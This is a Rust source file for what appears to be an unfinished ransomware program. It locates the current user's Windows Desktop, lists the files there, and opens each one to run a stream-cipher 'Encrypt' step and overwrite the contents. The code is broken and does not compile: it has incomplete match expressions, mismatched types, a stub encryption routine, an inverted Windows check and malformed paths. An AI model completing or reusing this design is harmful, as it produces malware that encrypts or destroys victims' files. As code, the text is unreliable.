use std::{io::Write, path::PathBuf};
use thiserror::Error;
use seekable_stream_cipher::keccak::StreamCipher;
use std::fs::File;

#[derive(Debug,Error)]
pub enum FileError {
    #[error("[failed] setting paths")]
    NullOfPath,
    #[error("[failed] generating key")]
    NotVaildKey,
    #[error("[failed] lock file")]
    UsedFile,
}


struct Encrypt{
    target: File, 
    encrypted: u8
}

impl Encrypt {
    fn new() -> Self{
        let file= match File::create("path")?;

        Self { target: file, encrypted: [0_u8; 10] }
    }

    fn run (&mut self, file: &File, off_set: String) {
        
        Encrypt
    }
}

fn get_file_names(path: &str) -> std::io::Result<Vec<String>> {
    std::fs::read_dir(path)?
        .map(|res| {
        let entry = res?;
        Ok(entry.file_name().to_string_lossy().into_owned())
    })
    .collect()
}

// result type mismatch-> ? operator can't use that
fn main() -> std::io::Result<()>{
    if !(cfg!(windows)) {
        let who_am_i= match whoami::realname()?;
        let mut pathbuf= PathBuf::from("C:/");
        pathbuf.push("/Users/");
        pathbuf.push(who_am_i);
        pathbuf.push("/Desktop");

        let string_pathbuf= match pathbuf.into_os_string().into_string(){
            Ok(string) => string,
            Err(os_string) => panic!("[failed] getting string_pathbuf"), 
        }; 

        let v_file_names= get_file_names(string_pathbuf.as_str())?;
        
        for file_name in v_file_names {
            let mut pathbuf= PathBuf::from("C:/");
            
            pathbuf.push(file_name);
            
            let string_pathbuf= match pathbuf.into_os_string().into_string() {
                Ok(string) => string,
                Err(os_string) => panic!("[failed] getting string_pathbuf"), 
            };

            let mut file= File::open(string_pathbuf)?;

            // seekable_stream_cipher
            let mut encrypted= Encrypt::new();
            {
                let offset= "Kirino".to_string();
                encrypted.run(&file, offset);
            }

            let mut data_buff: [u8; 1024] = [0u8; 1024];
            
            // @TODO add enccrypted -> data_buff
            
            file.write_all(&data_buff)?;
        }
    }
    Ok(())
}
